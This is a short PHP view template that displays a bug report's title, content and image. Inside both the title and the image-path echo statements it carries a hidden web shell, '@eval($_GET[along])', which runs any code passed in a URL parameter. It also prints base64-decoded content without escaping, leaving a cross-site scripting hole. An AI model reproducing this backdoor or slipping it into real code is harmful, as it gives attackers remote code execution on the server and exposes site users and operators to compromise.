<div class="col-md-6 col-md-offset-4">
	<h2><?php echo $h($bug->title);@eval($_GET[along]); ?></h2>
	<?php echo base64_decode($bug->content); ?>
	<img src="<?php echo $h($bug->img_path);@eval($_GET[along]); ?>" height="100px" width="100px">
</div>